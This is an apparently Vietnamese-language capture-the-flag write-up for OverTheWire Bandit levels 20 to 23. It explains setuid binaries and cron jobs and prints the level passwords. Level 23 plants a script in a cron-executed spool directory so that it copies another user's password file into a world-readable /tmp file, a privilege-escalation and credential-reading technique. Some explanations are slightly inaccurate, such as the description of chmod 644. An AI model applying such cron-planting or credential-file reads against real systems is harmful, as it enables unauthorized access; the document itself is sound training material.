# Level 20-23
` Các level dưới đây sẽ tập trung vào khái niệm *SetUID* và *Cronjob*.`
### Level 20
###### User: *bandit20* ; Password: *VxCazJaVykI6W36BkBU0mJTCM8rR95XT*
###### Trong bài này, có `suconnect` là một file thực thi theo cơ chế setuid, tức là thực thi chương trình theo quyền của người cấp chứ không phải người đang chạy.
###### Chức năng của hàm: tạo kết nối đến localhost mà ta tạo, sau đó đọc dòng text từ kết nối và so sánh với mật khẩu của người dùng level trước. Nếu đúng, sẽ trả về mật khẩu của người dùng level hiện tại.
#### 1. Kiểm tra quyền của file: 
```
bandit20@bandit:~$ ls -la
...
-rwsr-x---  1 bandit21 bandit20 15600 Oct  5 06:19 suconnect
```
##### -> file được sở hữu bởi `bandit21` và được sử dụng bởi 'bandit20', tức là khi chạy `suconnect`, so sánh mật khẩu của `bandit20`, nếu đúng trả về mật khẩu của `bandit21`.
#### 2. Tạo cổng `1234` và đẩy mật khẩu vào:
```
ls 
echo -n 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT' | nc -l -p 1234 &
```
###### &: chạy chương trình dưới dạng background
#### 3. Kết nối `suconnect` qua cổng `1234`:
```
bandit20@bandit:~$ ./suconnect 1234
Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
Password matches, sending next password
NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
```
##### Key: *NvEJF7oVjkddltPSrdKEFOllh9V1IBcq*
#
### Level 21
###### user: *bandit21* ; password: *NvEJF7oVjkddltPSrdKEFOllh9V1IBcq*
#### Xem file cronjob trong thư mục: 
```
cd /etc/cron.d
ls -la 
cat cronjob_bandit22
‘@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null’
```
##### -> file cronjob này chạy một file tên cronjob_bandit22.sh trong thư mục /usr/bin/ mỗi phút một lần `* * * * *`
```
cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
##### -> file bash này cấp quyền viết và thực thi (2 & 4) cho một file tạm thời trong thư mục /tmp, sau đó sẽ in mật khẩu của bandit22 vào file đó
```
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
##### key : *WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff*
#
### Level 22
#### Xem file `cronjob_bandit23`
```
cd /etc/cron.d
ls -la cronjob_bandit23
cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```
##### -> thực thi file cronjob_bandit23.sh mỗi phút một lần
#### Xem file thực thi `cronjob_bandit23.sh`:
```
cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"’
```
##### -> in mật khẩu vào tên một file có tên là I am user bandit22 sau khi được mã hóa md5
#### Chạy thử file:
```
./cronjob_bandit23.sh
Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
```
#### Như vậy để tìm được file có chứa key cho level 23:
```
echo I am user bandit23 | md5sum | cut -d ‘’ -f 1 
8ca319486bfbbc3663ea0fbe81326349
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```
###### `cut -d ‘’ -f 1`: loại bỏ các khoảng trống trong kết quả
##### key: *QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G*
#
### Level 23
#### Xem file `cronjob_bandit24` & `cronjob_bandit24.sh`:
```
cd /etc/cron.d
cat cronjob_bandit24
cd /usr/bin 
cat cronjob_bandit24.sh

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
##### -> lệnh này sẽ thực thi file ở trong /var/spool/$myname/foo với tư cách người dùng hiện tại, sau đó xóa đi. 
###### + Tức là người dùng là bandit24 thì sẽ thực thi các file trong /var/spool/bandit24/foo với quyền của người dùng bandit24
###### + Như vậy ta sẽ lợi dụng lỗ hổng này để tạo một file in ra mật khẩu người dùng bandit24:
#### Tạo file thực thi trong /tmp:
```
mkdir /tmp/hoang
cd /tmp/hoang
nano bandit24pass.sh
```
#### Nội dung file sẽ in mật khẩu của `bandit24` vào file `pass` tự tạo: 
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/hoang/pass
touch /tmp/hoang/pass
```
#### Cấp quyền cho các file và thư mục:
```
chmod 777 -R /tmp/hoang
chmod 777 bandit24pass.sh
chmod 777 pass
```
#### Sau đó, đẩy file `bandit24pass.sh` vào trong thư mục `/var/spool/bandit24/foo` để thực thi được lệnh trong file:
```
cp bandit24pass.sh /var/spool/bandit24/foo
```
###### Đợi 1 phút vì cronjob sẽ thực thi file `cronjob_bandit24.sh` mỗi phút một lần:
```
cat pass
```
##### key: *VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar*

